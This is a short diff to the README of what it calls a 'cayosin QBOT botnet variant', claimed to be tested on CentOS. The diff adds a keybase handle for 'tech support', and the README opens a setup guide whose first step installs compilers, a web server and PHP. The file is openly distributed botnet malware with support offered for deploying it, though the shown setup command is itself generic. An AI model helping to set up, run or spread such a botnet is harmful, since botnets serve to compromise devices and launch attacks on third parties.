@@ -1,5 +1,7 @@
 cayosin QBOT botnet variant. tested and working on centos 6, 6.9 and 7.7.
 
+for tech support add me on keybase.io @juutalainen
+
 installation / setup guide:
 
 yum update -y; yum install wget python gcc nano screen httpd php -y; service httpd start; ulimit -n 999999
